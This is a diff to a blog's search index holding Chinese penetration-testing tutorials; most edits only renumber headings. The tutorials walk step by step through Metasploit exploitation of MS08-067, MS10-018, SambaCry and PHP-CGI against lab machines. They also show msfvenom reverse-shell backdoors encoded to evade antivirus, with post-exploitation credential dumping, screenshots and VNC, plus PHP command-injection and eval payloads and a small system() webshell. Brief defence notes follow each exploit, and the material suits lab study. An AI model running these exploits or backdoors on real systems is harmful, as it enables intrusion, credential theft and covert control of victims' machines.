@@ -1304,12 +1304,12 @@ bp抓包修改。
   <entry>
     <title>MSF的使用以及漏洞复现</title>
     <url>/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/</url>
-    <content><![CDATA[一、MSF 是什么？(一) 基础概述定义：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
+    <content><![CDATA[一、MSF 是什么？1. 基础概述定义：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
 主要功能：漏洞利用、生成攻击载荷、监听反弹连接、后渗透( 当攻击者**成功利用漏洞、拿到目标主机控制会话(Meterpreter)**之后，所执行的全部操作)； 常用组件为msfconsole交互控制台、msfvenom后门生成工具。  
 安装目录（Kali默认）/usr/share/metasploit-framework/
 
 
-(二) 核心目录分工
+2. 核心目录分工
 
 
 目录
@@ -1337,9 +1337,9 @@ tools
 独立编码、漏洞分析小工具
 
 
-(三) modules六大子模块详解
 
-Auxiliary 辅助模块
+3. modules六大子模块详解
+3.1 Auxiliary 辅助模块
 目录：modules&#x2F;auxiliary&#x2F;
 作用：不执行漏洞提权、不反弹shell；信息收集、扫描、爆破、嗅探、验证
 特点：无payload，单纯工具类，绝大多数不需要目标存在漏洞
@@ -1361,7 +1361,7 @@ use auxiliary/scanner/smb/smb_versionset RHOSTS 192.168.1.105run
 示例 3：SSH 弱口令爆破
 use auxiliary/scanner/ssh/ssh_loginset RHOSTS 192.168.1.100set USER_FILE /usr/share/wordlists/metasploit/default_users_for_smb.txtset PASS_FILE /usr/share/wordlists/metasploit/password.lstset THREADS 5run
 
-Exploits 漏洞利用模块（EXP）
+3.2 Exploits 漏洞利用模块（EXP）
 目录：modules&#x2F;exploits&#x2F;
 作用：利用程序漏洞触发内存溢出、命令执行、文件上传等缺陷，开辟通道
 特点：必须搭配Payload使用！exp负责打通漏洞通道，payload负责执行代码
@@ -1373,7 +1373,7 @@ Web漏洞：远程代码执行RCE
 
 
 
-Payloads 攻击载荷（Shellcode）
+3.3 Payloads 攻击载荷（Shellcode）
 目录：modules&#x2F;payloads&#x2F;
 作用：漏洞利用成功后，在目标机器上最终执行的代码
 Payload三大类型
@@ -1396,7 +1396,7 @@ cmd/unix/reverse_netcat 简易nc反弹shell
 
 Meterpreter属于高级payload，内存运行、无落地文件、功能极强
 
-Encoders 编码器（免杀编码）
+3.4 Encoders 编码器（免杀编码）
 目录：modules&#x2F;encoders&#x2F;作用：对payload进行编码变形，绕过杀毒软件、IDS、防火墙特征检测
 核心原理：原始shellcode存在固定特征，容易被AV查杀；编码器替换字符、改变二进制序列，运行时自动解码还原。
 经典编码器：x86/shikata_ga_nai 万花筒编码器
@@ -1404,7 +1404,7 @@ Encoders 编码器（免杀编码）
  生成 exe 后门时加 -e 参数调用，多次编码提升免杀概率。  
 # msfvenom示例，编码5次msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe &gt; shell.exe
 
-Nops 空指令模块（NOP生成器）
+3.5 Nops 空指令模块（NOP生成器）
 目录：modules&#x2F;nops&#x2F;
 
 
@@ -1415,7 +1415,7 @@ NOP &#x3D; No Operation，0x90，CPU空指令：执行这条命令什么都不�
 原理：溢出利用时，很难精准命中shellcode起始地址；大量0x90滑行区，只要跳转进NOP区域，CPU一路空滑，最终执行payload。
 适用场景：漏洞研究、自行编写EXP
 
-Post 后渗透模块
+3.6 Post 后渗透模块
 目录：modules&#x2F;post&#x2F;
 触发时机：已经拿到目标权限（Meterpreter会话）之后使用， 依赖 SESSION。
 作用：权限维持、信息窃取、内网横向移动、提权、痕迹清理
@@ -1434,6 +1434,7 @@ run post/windows/gather/hashdump
 
 方式2：background会话后use调用
 background			# 将会话放到后台，得到session编号sessions        # 查看所有会话use post/windows/gather/credentials/windows_autologinset SESSION 1		# 指定使用哪一条meterpreter会话run
+
 
 二、MSF控制台基础命令
 
@@ -1504,9 +1505,7 @@ msfconsole
 
 
 
-
 ？
-
 
 
 
@@ -1514,9 +1513,7 @@ earch
 
 
 
-
 use
-
 
 
 
@@ -1524,15 +1521,14 @@ exit
 
 
 
-三、MSF 渗透测试(一) MS08-067简介MS08-067 是Windows XP及部分旧版本Windows系统中著名的远程代码执行漏洞（CVE-2008-4250），存在于 Server服务的RPC请求处理 中。
+三、MSF 渗透测试1. MS08-0671.1 简介MS08-067 是Windows XP及部分旧版本Windows系统中著名的远程代码执行漏洞（CVE-2008-4250），存在于 Server服务的RPC请求处理 中。
 攻击者可通过 SMB（端口445） 发送特制RPC请求，触发 NetPathCanonicalize 函数的缓冲区溢出，从而在无需身份验证的情况下执行任意代码。该漏洞曾被蠕虫病毒 Conficker 大规模利用。
-命令行汇总# 1. 静默启动MSF控制台msfconsole -q# 2. 检索MS08-067漏洞模块search ms08-067# 3. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi# 4. 查看模块所需配置参数show options# 5. 设置受害机IPset RHOSTS xxxx# 6. 执行漏洞攻击run# 7. 成功进入meterpreter后调出系统cmd命令行shell# 8. 返回meterpreter控制台exit
+
+1.2 命令行汇总# 1. 静默启动MSF控制台msfconsole -q# 2. 检索MS08-067漏洞模块search ms08-067# 3. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi# 4. 查看模块所需配置参数show options# 5. 设置受害机IPset RHOSTS xxxx# 6. 执行漏洞攻击run# 7. 成功进入meterpreter后调出系统cmd命令行shell# 8. 返回meterpreter控制台exit
 
 
-
-攻击步骤环境：WinXP SP3，445端口开放
+1.3 攻击步骤环境：WinXP SP3，445端口开放
 前提条件：已知目标机的 IP 地址 192.168.23.136
-
 
 
 启动 MSF 框架，准备攻击，执行 msfconsole 命令
@@ -1541,24 +1537,19 @@ msfconsole -q
 
 
 
-
 加载漏洞模块，配置攻击参数
 
 search MS08-067  
 
 
-
 use 0
-
 
 
 show options
 
 
-
 设置目标 IP 地址
 set RHOSTS 192.168.23.136 
-
 
 
 
@@ -1567,24 +1558,23 @@ set RHOSTS 192.168.23.136
 run
 
 
-
 shell
 
 
 
-防御
+1.4 防御
 安装KB958644补丁
 关闭445端口 或限制SMB服务对外访问。
 部署防火墙与入侵检测系统，过滤异常RPC&#x2F;SMB流量。
 定期进行漏洞扫描与系统加固，避免使用已停止支持的操作系统。
 
-(二) MS10-018 IE浏览器简介MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。 
+
+2. MS10-018 IE浏览器2.1 简介MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。 
 利用方式：MSF搭建恶意网页服务，生成钓鱼URL诱导目标访问，后台监听等待上线
-命令行汇总# 1. 静默启动MSFmsfconsole -q# 2. 搜索MS10-018 IE漏洞模块search ms10-018# 3. 加载IE溢出利用模块use exploit/windows/browser/ms10_018_ie_behaviors# 4. 查看模块配置项show options# 5. 设置攻击机本机IP（生成钓鱼网页地址）set SRVHOST xxxx# 6. 选用正向连接载荷set PAYLOAD windows/meterpreter/bind_tcp# 7. 自定义受害机监听端口，规避4444默认特征set LPORT xxx# 8. 启动攻击服务run# 9. 查看所有被控主机会话sessions# 10. 接入ID为1的受害机会话sessions -i 1# 11. 调出目标系统cmd命令行shell# 12. 切回meterpreterexit
+2.2 命令行汇总# 1. 静默启动MSFmsfconsole -q# 2. 搜索MS10-018 IE漏洞模块search ms10-018# 3. 加载IE溢出利用模块use exploit/windows/browser/ms10_018_ie_behaviors# 4. 查看模块配置项show options# 5. 设置攻击机本机IP（生成钓鱼网页地址）set SRVHOST xxxx# 6. 选用正向连接载荷set PAYLOAD windows/meterpreter/bind_tcp# 7. 自定义受害机监听端口，规避4444默认特征set LPORT xxx# 8. 启动攻击服务run# 9. 查看所有被控主机会话sessions# 10. 接入ID为1的受害机会话sessions -i 1# 11. 调出目标系统cmd命令行shell# 12. 切回meterpreterexit
 
-攻击步骤环境：WinXP IE6&#x2F;7
+2.3 攻击步骤环境：WinXP IE6&#x2F;7
 前提条件：已知目标机的 IP 地址 192.168.23.136
-
 
 
 启动 MSF ，准备攻击，执行 msfconsole 命令
@@ -1593,15 +1583,12 @@ msfconsole -q
 
 
 
-
 加载漏洞模块
 
 search MS10-018  
 
 
-
 use 0
-
 
 
 
@@ -1643,13 +1630,10 @@ bind_tcp 正向 shell 缺点
 show options
 
 
-
 查看攻击机的 IP 192.168.23.131
-
 
 设置攻击机的 IP 地址
 set SRVHOST 192.168.23.131 
-
 
 
 修改 bind_tcp 载荷 LPORT，即自定义受害机监听端口
@@ -1662,17 +1646,13 @@ set LPORT 9999
 
 
 
-
 启动攻击服务
 
 run
 
 
-
 出现的 url 要通过社⼯等⽅法让⽬标机进⾏访问。
 这里我们直接让目标机访问这个 url
-
-
 
 
 回车
@@ -1682,10 +1662,8 @@ run
 sessions
 
 
-
 进入这个会话 1（i 就是 in，1 表示会话的 id）
 sessions -i 1
-
 
 
 出现 meterpreter &gt; 提示符，代表漏洞利用成功、已和受害机建立控制通道，可以对目标进行操作。
@@ -1695,17 +1673,17 @@ sessions -i 1
 shell
 
 
-
-防御
+2.4 防御
 安装KB980182补丁
 禁用危险ActiveX
 开启DEP&#x2F;ASLR内存保护。
 
-(三) CVE-2017-7494 SambaCry（Linux永恒之蓝）简介CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。  
-漏洞的核心在于 Samba 的 is_known_pipename () 函数中存在字符过滤问题 ，导致攻击者可以向共享目录传递恶意文件，从而被远程代码执行。  
-命令行汇总# 1. 启动MSF控制台 msfconsole -q # 2. 搜索漏洞模块 search CVE-2017-7494 # 3. 加载漏洞利用模块 use exploit/linux/samba/is_known_pipename # 4. 设置目标IP set RHOSTS xxxx # 5. 执行攻击 run
 
-攻击步骤
+3. CVE-2017-7494 SambaCry（Linux永恒之蓝）3.1 简介CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。  
+漏洞的核心在于 Samba 的 is_known_pipename () 函数中存在字符过滤问题 ，导致攻击者可以向共享目录传递恶意文件，从而被远程代码执行。  
+3.2 命令行汇总# 1. 启动MSF控制台 msfconsole -q # 2. 搜索漏洞模块 search CVE-2017-7494 # 3. 加载漏洞利用模块 use exploit/linux/samba/is_known_pipename # 4. 设置目标IP set RHOSTS xxxx # 5. 执行攻击 run
+
+3.3 攻击步骤
 环境搭建：Vulhub搭建Samba 3.5~4.6.4
 搭建 Vulhub 靶场前提：Ubuntu 宿主机预先安装 git、docker、docker-compose；通过 git 下载 vulhub 源码包；操作时切换 root 权限，进入对应漏洞目录，执行docker-compose up -d后台启动漏洞容器。  
 部署教程：https://blog.csdn.net/m0_73909316&#x2F;article&#x2F;details&#x2F;142954056
@@ -1724,12 +1702,10 @@ shell
 # 切换root管理员权限su root
 
 
-
 提示符变为 root@ubuntu# 代表切换成功
 # 进入 vulhub 中Samba漏洞目录（目录内要有docker-compose.yml）cd /home/enjoy/vulhub-master/samba/CVE-2017-7494
 
 # 后台启动漏洞容器docker-compose up -d
-
 
 
 注：实验结束，关闭销毁靶场
@@ -1743,11 +1719,9 @@ ifconfig
 
 
 
-
 启动 MSF
 
 msfconsole -q
-
 
 
 
@@ -1757,11 +1731,9 @@ search CVE-2017-7494
 
 
 
-
 加载SambaCry漏洞的攻击模块
 
 use 0
-
 
 
 
@@ -1771,11 +1743,9 @@ show options
 
 
 
-
 设置远程受害主机IP
 
 set RHOSTS 192.168.23.135
-
 
 
 
@@ -1789,17 +1759,17 @@ run
 id
 
 
-
-防御
+3.4 防御
 升级Samba版本
 禁用nt pipe
 共享目录设只读
 防火墙限制445端口。
 
-(四) CVE-2012-1823（PHP CGI漏洞利用）简介CVE-2012-1823 是 PHP-CGI 模式 下的高危远程代码执行漏洞，影响 PHP &lt; 5.3.12 和 PHP &lt; 5.4.2 版本。当 PHP 以 CGI 模式运行时，QUERY_STRING 中的参数会被直接当作 php-cgi 命令行参数 解析，从而允许攻击者传入 -s、-d、-c 等开关，实现源码泄露或任意代码执行。漏洞成因 根据 RFC3875 规范，当 QUERY_STRING 中不包含 &#x3D; 时，Web 服务器会将其作为命令行参数传递给 CGI 程序。PHP 在 CGI SAPI 中未正确过滤这些参数，导致攻击者可构造恶意 URL 直接传递命令行选项。
-命令行汇总# 启动MSF控制台msfconsole# 2. 搜索漏洞模块 search CVE-2012-1823# 加载PHP-CGI参数注入EXP模块use exploit/multi/http/php_cgi_arg_injection# 设置目标IP（Ubuntu靶机地址）set RHOSTS xxxx# 设置目标端口set RPORT 8080# 执行漏洞攻击run# 成功获取会话后，调取目标系统原生命令行shell# 查看当前系统权限id
 
-攻击步骤
+4. CVE-2012-1823（PHP CGI漏洞利用）4.1 简介CVE-2012-1823 是 PHP-CGI 模式 下的高危远程代码执行漏洞，影响 PHP &lt; 5.3.12 和 PHP &lt; 5.4.2 版本。当 PHP 以 CGI 模式运行时，QUERY_STRING 中的参数会被直接当作 php-cgi 命令行参数 解析，从而允许攻击者传入 -s、-d、-c 等开关，实现源码泄露或任意代码执行。漏洞成因 根据 RFC3875 规范，当 QUERY_STRING 中不包含 &#x3D; 时，Web 服务器会将其作为命令行参数传递给 CGI 程序。PHP 在 CGI SAPI 中未正确过滤这些参数，导致攻击者可构造恶意 URL 直接传递命令行选项。
+4.2 命令行汇总# 启动MSF控制台msfconsole# 2. 搜索漏洞模块 search CVE-2012-1823# 加载PHP-CGI参数注入EXP模块use exploit/multi/http/php_cgi_arg_injection# 设置目标IP（Ubuntu靶机地址）set RHOSTS xxxx# 设置目标端口set RPORT 8080# 执行漏洞攻击run# 成功获取会话后，调取目标系统原生命令行shell# 查看当前系统权限id
+
+4.3 攻击步骤
 **环境搭建： 靶机vulhub **
 
 
@@ -1809,11 +1779,9 @@ id
 
 
 
-
 启动 MSF
 
 msfconsole -q
-
 
 
 
@@ -1823,11 +1791,9 @@ search CVE-2012-1823
 
 
 
-
 加载漏洞攻击模块
 
 use 0
-
 
 
 
@@ -1837,13 +1803,10 @@ show options
 
 
 
-
 设置远程受害主机IP 和 端口
 
 
-
 set RHOSTS 192.168.23.135set RPORT 8080
-
 
 
 
@@ -1853,34 +1816,32 @@ run
 
 
 
-
 启动命令行
 
 shellid		#查看当前执行权限ip addr
 
 
-
-防御
+4.4 防御
 升级 PHP 到 5.3.12、5.4.2 及以上安全版本；
 废弃 PHP-CGI 模式，改用 PHP-FPM；
 在 Apache&#x2F;Nginx 配置规则，拦截-d、-s等危险 URL 参数；
 使用低权限账号运行 PHP 程序；
 监控日志与进程行为，及时发现漏洞攻击尝试。
 
-四、msfvenom 生成后门木马(一) Msfvenom 是什么？Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
-(二) 使用场景Msfvenom常用于红队渗透测试和社会工程学攻击中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
-(三) 核心参数
--p 指定使用的攻击 payload（后门类型），例如windows/meterpreter/reverse_tcp
+
+5. msfvenom 生成后门木马5.1 Msfvenom 是什么？Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
+5.2 使用场景Msfvenom常用于**红队渗透测试**和**社会工程学攻击**中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
+5.3 核心参数
+-p 指定使用的攻击 payload（后门类型），例如&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;windows/meterpreter/reverse_tcp
 LHOSTLocal Host，攻击机（Kali）IP，受害机主动反弹连接这个地址
 LPORT 攻击机开启监听的端口
 -f 文件输出格式（elf、exe、so、raw 等）
 -o 保存生成的后门文件（output）
 
-(四) 基础语法msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件
+5.4 基础语法msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件
 
-(五) Windows木马示例
+5.5 Windows木马示例
 查看攻击机的 IP 192.168.23.131
-
 
 
 
@@ -1894,8 +1855,6 @@ LHOST=192.168.23.131：攻击机Kali的IP，靶机主动连接该地址
 LPORT=9999：靶机连接攻击机的端口
 -f exe：输出格式为Windows可执行程序
 &gt; hello.exe：将内容输出保存为hello.exe（等价 -o hello.exe）
-
-
 
 
 
@@ -1914,9 +1873,7 @@ exploit -j：-j &#x3D; job后台运行监听，不会占用当前窗口
 
 
 
-
 把木马放到靶机并运行hello.exe，成功得到meterpreter &gt; 后执行
-
 
 
 
@@ -1925,9 +1882,7 @@ exploit -j：-j &#x3D; job后台运行监听，不会占用当前窗口
 sessions
 
 
-
 sessions -i 1
-
 
 
 
@@ -1936,13 +1891,10 @@ sessions -i 1
 screenshot      # 对受害主机屏幕截图
 
 
-
 shell           # 调出目标原生cmd命令行ipconfig
 
 
-
 run vnc         # 开启VNC远程桌面控制
-
 
 
 ]]></content>
@@ -2429,8 +2381,6 @@ http://localhost/1.php?x=echo%20abc;
 
 
 
-
-
 远程命令执行（system函数示例）
 
 &lt;?php$code=$_GET[&#x27;x&#x27;];echo system($code);?&gt;
@@ -2441,7 +2391,6 @@ http://localhost/2.php?x=ipconfig
 
 
 
-
 http://localhost/2.php?x=whoami
 
 
@@ -2449,9 +2398,7 @@ http://localhost/2.php?x=whoami
 案例1：Ping命令注入（靶场：https://mozhe.cn/bug/detail/12）
 
 
-
 页面输入127.0.0.1正常ping
-
 
 
 
@@ -2459,9 +2406,7 @@ http://localhost/2.php?x=whoami
 
 
 
-
 前端JS限制IP格式，前端过滤可绕过。
-
 
 
 
@@ -2469,9 +2414,7 @@ Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼�
 
 
 
-
 查看返回目录：index.php、key_xxxx.php。
-
 
 
 
@@ -2479,12 +2422,10 @@ Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼�
 
 
 
-
 注：命令分隔符有|、||、&amp;、&amp;&amp;、;
 
+
 案例2 PHP反引号命令执行（靶场：https://mozhe.cn/bug/detail/13）
-
-
 
 
 
@@ -2495,13 +2436,11 @@ Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼�
 
 新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。
 
-
 PHP中内容反引号内内容会被当作系统shell命令执行。
 &lt;?phpecho `$_REQUEST[a]`;?&gt;
 
 
 payload1：?a=ls 列出当前目录，发现key文件。
-
 
 
 
@@ -2520,13 +2459,7 @@ https://mozhe.cn/bug/detail/309
 
 
 
-
-
-
-
-
 登录拦截
-
 
 
 
@@ -2543,23 +2476,15 @@ old=test|cat /key.txt 读取根目录key
 
 
 
-
 获取 cookie
 
 
 
 
 
-
-
 案例4 PbootCMS代码执行漏洞
-
 (1) 漏洞分析漏洞成因：页面{pboot:if(eval($_POST[1]))}标签解析，POST参数1可控。
 审计⼯具查询危险函数：
-
-
-
-
 
 
 
@@ -2570,11 +2495,7 @@ eval(&#x27;if(&#x27; . $matches[1][$i] . &#x27;)&#123;$flag=&quot;if&quot;;&#125
 在线留言
 
 
-
 AboutController ： &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;/pboot:if&#125;  
-
-
-
 
 
 
@@ -2583,16 +2504,12 @@ AboutController ： &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;/pboot:if&#125
 登录后台：admin.php
 
 
-
 账号：admin 密码：1234556
-
-
 
 
 
 访问首页：http://localhost/pcms/index.php/about/10.html
 POST传参：1=phpinfo();，触发eval执行代码。
-
 
 
 
